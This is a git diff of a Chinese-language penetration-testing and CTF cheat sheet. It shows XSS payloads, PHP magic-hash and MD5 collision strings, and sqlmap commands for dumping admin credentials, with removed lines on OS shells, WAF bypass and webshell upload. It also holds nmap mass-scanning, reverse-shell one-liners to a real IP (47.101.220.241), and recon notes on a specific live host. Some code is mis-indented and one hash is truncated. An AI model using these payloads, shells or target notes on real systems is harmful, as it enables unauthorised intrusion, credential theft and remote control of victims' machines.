-<p class="comment" title="--><script><!--" data-comment='{"id":1}'></p>
-<p class="comment" title="-->prompt(1<!--" data-comment='{"id":2}'></p>
-<p class="comment" title="-->)</script>" data-comment='{"id":3}'></p>
-```
 
 
 ### alert(1) to win
@@ -2345,90 +1640,70 @@ location ~ \.php$ {
 
     ==md5==
 
-    ​        QNKCDZO
+    QNKCDZO
+0e830400451993494058024219903391
+    s155964671a
+0e342768416822451524974117254469
+    s214587387a
+0e848240448830537924465865611904
+    s878926199a
+0e545993274517709034328855841020
+    s1091221200a
+0e940624217856561557816327384675
+    s1885207154a
+0e509367213418206700842008763514
+    s1836677006a
+0e481036490867661113260034900752
+    s1184209335a
+0e072485820392773389523109082030
+    s1665632922a
+0e73119806149116307319712
+    s1502113478a
+0e861580163291561247404381396064
+    s532378020a
+0e220463095855511507588041205815
+    
 
-    ​        0e830400451993494058024219903391
-
-    ​        s155964671a
-
-    ​        0e342768416822451524974117254469
-
-    ​        s214587387a
-
-    ​        0e848240448830537924465865611904
-
-    ​        s878926199a
-
-    ​        0e545993274517709034328855841020
-
-    ​        s1091221200a
-
-    ​        0e940624217856561557816327384675
-
-    ​        s1885207154a
-
-    ​        0e509367213418206700842008763514
-
-    ​        s1836677006a
-
-    ​        0e481036490867661113260034900752
-
-    ​        s1184209335a
-
-    ​        0e072485820392773389523109082030
-
-    ​        s1665632922a
-
-    ​        0e731198061491163073197128363787
-
-    ​        s1502113478a
-
-    ​        0e861580163291561247404381396064
-
-    ​        s532378020a
-
-    ​        0e220463095855511507588041205815
-
-    ==sha1==	
-    ​	10932435112: 0e07766915004133176347055865026311692244
-    ​	aaroZmOk: 0e66507019969427134894567494305185566735
-    ​	aaK1STfY: 0e76658526655756207688271159624026011393
-    ​	aaO8zKZF: 0e89257456677279068558073954252716165668
-    ​	aa3OFF9m: 0e36977786278517984959260394024281014729
+==sha1==	
+    10932435112: 0e07766915004133176347055865026311692244
+aaroZmOk: 0e66507019969427134894567494305185566735
+aaK1STfY: 0e76658526655756207688271159624026011393
+aaO8zKZF: 0e89257456677279068558073954252716165668
+    aa3OFF9m: 0e36977786278517984959260394024281014729
 
     ==crc32==
-
-    ​	6586: 0e817678
-
+    
+    6586: 0e817678
+    
     两个 md5 一样的字符串
-
+    
     ```python
-    from binascii import unhexlify
+from binascii import unhexlify
     from hashlib import md5
-    from future.moves.urllib.parse import quote
+from future.moves.urllib.parse import quote
     
-    input1 = 'Oded Goldreich\nOded Goldreich\nOded Goldreich\nOded Go' + unhexlify(
+input1 = 'Oded Goldreich\nOded Goldreich\nOded Goldreich\nOded Go' + unhexlify(
     'd8050d0019bb9318924caa96dce35cb835b349e144e98c50c22cf461244a4064bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf67c12978647f5af123de3acf844085cd025b956')
-    
+
     print(quote(input1))
     print md5(input1).hexdigest()
     
     input2 = 'Neal Koblitz\nNeal Koblitz\nNeal Koblitz\nNeal Koblitz\n' + unhexlify('75b80e0035f3d2c909af1baddce35cb835b349e144e88c50c22cf461244a40e4bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf6fc11978647f5af123de3acf84408dcd025b956')
     print md5(input2).hexdigest()
     print(quote(input2))
-    ```
-
-    另外一组 md5 一样的字符串
-
-    ```python
+```
+    
+另外一组 md5 一样的字符串
+    
+​```python
     from array import array
-    from hashlib import md5
+from hashlib import md5
     input1 = array('I', [0x6165300e,0x87a79a55,0xf7c60bd0,0x34febd0b,0x6503cf04,0x854f709e,0xfb0fc034,0x874c9c65,0x2f94cc40,0x15a12deb,0x5c15f4a3,0x490786bb,0x6d658673,0xa4341f7d,0x8fd75920,0xefd18d5a])
     input2 = array('I', [x^y for x,y in zip(input1, [0, 0, 0, 0, 0, 1<<10, 0, 0, 0, 0, 1<<31, 0, 0, 0, 0, 0])])
     print(input1 == input2) # False
     print(md5(input1).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41
     print(md5(input2).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41
-    ```
+```
 
 **伪协议**
 
@@ -2502,7 +1777,7 @@ print_r(__FILE__);
 1.print_r(scandir(getcwd())); 
 2.print_r(scandir(dirname(__FILE__))); 
 3.print_r(glob("*"))
-    
+
 遍历当前目录的前目录的文件:
 print_r(scandir(dirname(__FILE__) . "/../"));
 打开文件:show_source('flag.php');
@@ -2661,7 +1936,7 @@ preg_replace() 的第一个参数如果存在 `/e` 模式修饰符，则允许�
 
     应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。
 
-+ Scanner[仅限专业版]
++ Scanner
 
     一个高级的工具，执行后，它能自动地发现 web应用程序的安全漏洞。
 
@@ -2696,32 +1971,10 @@ options -> number of threads  # 设置多线程
 start attack  # 观察状态码和长度
 ```
 
-若 Burp 无法抓取 DVWA 等本地包，代理设置中删除 `不使用代理` ：<u>localhost,127.0.0.1</u> 即可
+若 Burp 无法抓取 DVWA 等本地包，代理设置中删除 `不使用代理` ：localhost,127.0.0.1即可
 
-#### 实例
 
-##### 目录与文件扫描
-
-##### 暴力破解后台
-
-##### 暴力破解一句话木马
-
-##### 配合 sqlmap 实现被动式注入发现
-
-##### 突破文件上传
-
-##### 数据获取测试
-
-### sqlmap
-
-```shell
-# 网站有防注入过滤，当提交and 1=1时，返回了非法操作的提示，再在网站后面添加其他字符，只要报错，就说明有注入
-# Acess 中转注入攻击
-sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs --tables
-# 表示使用cookie的方式提交， --level 表示测试的等级, --dbs表示将数据库显示出来，--tables是将表名显示出来。程序员没有考虑到恶意用户会通过cookie来提交参数，因此没有调用防注入程序来过滤cookie部分，从而导致cookie注入的发生
-sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs -T admin --columns  # 指定 admin 表
-sqlmap -u http://172.16.12.2/onews.asp --cookie "id=40" --level 3 --dbs -T admin -C admin password --dump # 将数据内容脱到本地
-```
+[最强手册](<https://momomoxiaoxi.com/2016/01/06/sqlmap-help/>)
 
 ```shell
 # 检查注入点：
@@ -2732,11 +1985,9 @@ sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --current-db
 
 # 指定库名列出所有表
 sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 --tables
-('vhost48330' 为指定数据库名称)
 
 # 指定库名表名列出所有字段
 sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin --columns
-('admin' 为指定表名称)
 
 # 指定库名表名字段dump出指定字段
 sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump  ('ac,id,password' 为指定字段名称)
@@ -2745,8 +1996,6 @@ sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C 
 **参数解释**
 
 ```
-* 在注入的过程中，有时候是伪静态的页面，可以使用星号表示可能存在注入的部分
-
 --data
 使用post方式提交的时候，就需要用到data参数了
 
@@ -2763,13 +2012,9 @@ sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C 
 这个参数可以指定SQLMAP使用的探测技术，默认情况下会测试所有的方式。
 支持的探测方式如下：
 B: Boolean-based blind SQL injection（布尔型注入）
-
 E: Error-based SQL injection（报错型注入）
-
 U: UNION query SQL injection（可联合查询注入）
-
 S: Stacked queries SQL injection（可多语句查询注入）
-
 T: Time-based blind SQL injection（基于时间延迟注入）
 ```
 
@@ -2785,19 +2030,7 @@ sqlmap -u 注入点url  --colums -T admin //爆出admin表，猜解它的字段
 sqlmap -u 注入点url  --dump -T admin -C "username,password"  //猜字段内容
 ```
 
-**MySQL数据库注入**
-
-```
-sqlmap -u url  --dbs  //获取数据库
-
-sqlmap  -u  url  -D 指定的数据库 --tables //获取数据库中的表
-
-sqlmap  -u  url  -D 指定的数据库 -T 表名  --columns  //获取表字段
-
-sqlmap  -u  url  -D 指定的数据库 -T 表名  -C id,user,pass --dump  //获取字段内容
-```
-
-**Cookie注入**
+**Cookie 注入**
 
 网站有判断，不让用and,update等参数时就得加上Cookie。
 
@@ -2815,22 +2048,12 @@ http://testasp.vulnweb.com/Login.asp
 
 **几种方式：**
 
-```
-sqlmap -r burp拦截数据.txt -p Pass(测试参数) //从文件读取数据包
+```shell
+sqlmap -r burp拦截数据.txt  # 从文件读取数据包，注入点用 * 替换
 
-sqlmap -u http://testasp.vulnweb.com/Login.asp  --forms //自动搜索表单
+sqlmap -u http://testasp.vulnweb.com/Login.asp  --forms 
 
-sqlmap -u http://testasp.vulnweb.com/Login.asp  --data "Name=1&Pass=1"  //手动添加数据
-```
-
-**获取系统交互shell**
-
-```
-1.sqlmap -u http://url.. --os-shell  //或者windows可以用--os-cmd 或--sql-shell
-
-2.选择网站服务端语言
-
-3.填写网站根目录C:/www/
+sqlmap -u http://testasp.vulnweb.com/Login.asp  --data "Name=1&Pass=1"  # 手动添加数据
 ```
 
 **伪静态注入**
@@ -2847,30 +2070,6 @@ Web防注入措施，在访问两次错误页面后，第三次必须访问正�
 --delay 2 //延时两秒访问
 
 --safe-freq 30  //人为配置次数
-```
-
-**绕过WAF防火墙**
-
-```
-sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs --batch
-
---tamper "space2morehash.py" //使用tamper脚本绕过
-
-类似脚本
-
-space2hash.py base64encode.py charencode.py
-```
-
-**file参数使用**
-
-必须为dba权限
-
-```
-sqlmap -u url --is-dba  //查看是否dba权限
-
-sqlmap -u url --file-write=本地木马路径(D:/shell.php)
-
---file-dest=目标根目录(C:/www/shell.php)
 ```
 
 **Tamper**
@@ -3021,11 +2220,7 @@ class DBMS:
 1. 内网渗透   攻击者单点突破，进入内网后，需进一步扩大成果，可以先扫描整个私有网络空间，发现哪些主机是有利用价值的，例如 10.1.1.1/8, 172.16.1.1/12, 192.168.1.1/16
 2. 全网扫描
 
-扫描一个巨大的网络空间，我们最关心的是效率问题，即时间成本。 
-
-在足够迅速的前提下，宁可牺牲掉一些准确性。
-
-扫描的基本思路是高并发地ping：
+扫描一个巨大的网络空间，我们最关心的是效率问题，即时间成本。 在足够迅速的前提下，宁可牺牲掉一些准确性。扫描的基本思路是高并发地 `ping`：
 
 ```shell
 nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml www.hackliu.com/16
@@ -3042,10 +2237,10 @@ nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.x
 
 -oX nmap_output.xml    将结果以XML格式输出，文件名为nmap_output.xml
 
-一旦扫描结束，解析XML文档即可得到哪些IP地址是存活的。
+一旦扫描结束，解析 XML文档即可得到哪些 IP 地址是存活的。
 ```
 
-测试扫描www.hackliu.com/16这B段，65535个IP地址（存活10156），耗时112.03秒
+测试扫描 www.hackliu.com/16 这B段，65535个IP地址（存活10156），耗时112.03秒
 
 #### 一、主机发现
 
@@ -3450,35 +2645,35 @@ dnmap_client -s 192.168.1.107 -a test
 
 12. 编写 Nse 脚本
 
-    (1)    -- The scanning module --
-        author = "Wing"
-        categories = {"version"}
+(1)    -- The scanning module --
+    author = "Wing"
+    categories = {"version"}
 
-        portrule = function(host,port)
-            return port.protocol == "tcp" and port.number == 80 and port.state == "open"
-        end
+    portrule = function(host,port)
+    return port.protocol == "tcp" and port.number == 80 and port.state == "open"
+    end
 
-        action = function(host,port)
-            return "Found!!!"
-        end
+    action = function(host,port)
+    return "Found!!!"
+    end
 
-    (2) -- The scanning module --
-        author = "Wing"
-        categories = {"version"}
+(2) -- The scanning module --
+    author = "Wing"
+    categories = {"version"}
 
-        local comm=require "comm"
-        require "shortport"
-        local http=require "http"
+    local comm=require "comm"
+    require "shortport"
+    local http=require "http"
 
-        portrule = function(host,port)
-            return (port.number == 80) and (port.start=="open")
-        end
+    portrule = function(host,port)
+    return (port.number == 80) and (port.start=="open")
+    end
 
-        action = function(host,port)
-            local uri = "/admin.php"
-            local response = http.get(host,port,uri)
-            return "Found!!!"
-        end
+    action = function(host,port)
+    local uri = "/admin.php"
+    local response = http.get(host,port,uri)
+    return "Found!!!"
+    end
 
 13. 探测防火墙
 nmap --script=firewalk --traceroute 192.168.1.111
@@ -3600,9 +2795,7 @@ samba-vuln-cve-2012-1182 //扫描Samba堆溢出漏洞
 
 ```
 1.http-wordpress-plugins
-
 2.http-wordpress-enum
-
 3.http-wordpress-brute
 ```
 
@@ -3842,18 +3035,18 @@ nc -l -p 8080 -vvv  # 加 k 则是持续监听
 靶机反弹 `bash`
 
 ```shell
-bash -i >& /dev/tcp/47.101.220.241/8008 0>&1
-bash%20-i%20>%26%20%2fdev%2ftcp%2f47.101.220.241%2f8008%2f0>%261%20|
+bash -i >& /dev/tcp/47.101.220.241/8004 0>&1
+bash%20-i%20>%26%20%2fdev%2ftcp%2f47.101.220.241%2f8008%2f0>%261
 ```
 
 反向连接
 
 ```shell
 # 拥有公网 ip 的机子
-nc -l -vvv -p 1023
+nc -lvvvp 9988
 
 # victim
-nc -t -e /bin/bash ip 1023
+nc -te /bin/bash 47.101.220.241 9988
 ```
 
 web 服务器
@@ -4034,7 +3227,7 @@ http://154.80.253.139:80/5cMlHAOg.aspx  # 暂时连不上
 http://154.80.253.139/phpMyAdmin/doc/html/index.html  # 偶然发现
 ```
 
-+ 最牛逼的信息收集网站
++ 信息收集网站
 
 ```shell
 https://dnslytics.com/ip/154.80.253.139
